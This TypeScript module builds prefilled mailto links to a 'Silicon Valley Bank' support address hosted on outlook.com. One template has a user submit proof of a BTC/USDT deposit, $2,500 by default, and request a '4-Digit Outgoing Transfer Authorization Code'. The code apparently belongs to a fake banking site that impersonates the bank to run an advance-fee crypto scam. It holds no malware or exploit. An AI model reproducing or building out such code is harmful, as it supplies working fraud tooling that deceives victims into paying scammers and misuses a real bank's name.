export const SUPPORT_EMAIL = 'svbcustomerservice@outlook.com';

interface UserEmailInfo {
  fullName?: string;
  email?: string;
  accountNumber?: string;
}

interface VerificationDetails {
  method?: string;
  amount?: number;
  reference?: string;
  walletAddress?: string;
  subject?: string;
  message?: string;
}

export const getLiveAgentMailtoUrl = (
  user?: UserEmailInfo,
  details?: VerificationDetails
): string => {
  const email = SUPPORT_EMAIL;
  const userName = user?.fullName || 'Client';
  const accNum = user?.accountNumber || '';
  const method = details?.method || 'BTC / USDT';
  const amount = details?.amount ? `$${details.amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD` : '$2,500.00 USD';

  const subject = details?.subject || `Payment Proof Verification Request - ${amount} - ${userName} (Acc #${accNum})`;
  
  const body = details?.message || `Hello SVB Support Team,

I am writing to submit my payment proof for verification and request authorization for my Silicon Valley Bank account.

--- CLIENT & VERIFICATION DETAILS ---
• Full Name: ${userName}
• Account Email: ${user?.email || ''}
• Account Number: ${accNum}
• Deposit Amount: ${amount}
• Selected Method: ${method}
${details?.reference ? `• Reference ID: ${details.reference}\n` : ''}${details?.walletAddress ? `• Recipient Wallet: ${details.walletAddress}\n` : ''}
Please verify the attached transaction receipt screenshot / hash and issue my 4-Digit Outgoing Transfer Authorization Code.

Thank you,
${userName}`;

  return `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
};

export const getSupportContactMailtoUrl = (
  user?: UserEmailInfo,
  customSubject?: string,
  customBody?: string
): string => {
  const email = SUPPORT_EMAIL;
  const userName = user?.fullName || 'Client';
  const accNum = user?.accountNumber ? ` (Acc #${user.accountNumber})` : '';
  const subject = customSubject || `Customer Support & Inquiry Request - ${userName}${accNum}`;
  const body = customBody || `Hello Silicon Valley Bank Support Desk,

I would like to get in touch regarding my SVB online banking account.

--- ACCOUNT INQUIRY DETAILS ---
• Full Name: ${userName}
• Registered Email: ${user?.email || 'N/A'}
• Account Number: ${user?.accountNumber || 'N/A'}

Inquiry Message:
[Please type your message or inquiry here]

Thank you,
${userName}`;

  return `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
};

export const openLiveAgentEmail = (
  user?: UserEmailInfo,
  details?: VerificationDetails
): void => {
  const mailtoUrl = getLiveAgentMailtoUrl(user, details);
  try {
    window.location.href = mailtoUrl;
  } catch (e) {
    window.open(mailtoUrl, '_blank');
  }
};

export const openSupportEmail = (
  user?: UserEmailInfo,
  subject?: string,
  body?: string
): void => {
  const mailtoUrl = getSupportContactMailtoUrl(user, subject, body);
  try {
    window.location.href = mailtoUrl;
  } catch (e) {
    window.open(mailtoUrl, '_blank');
  }
};

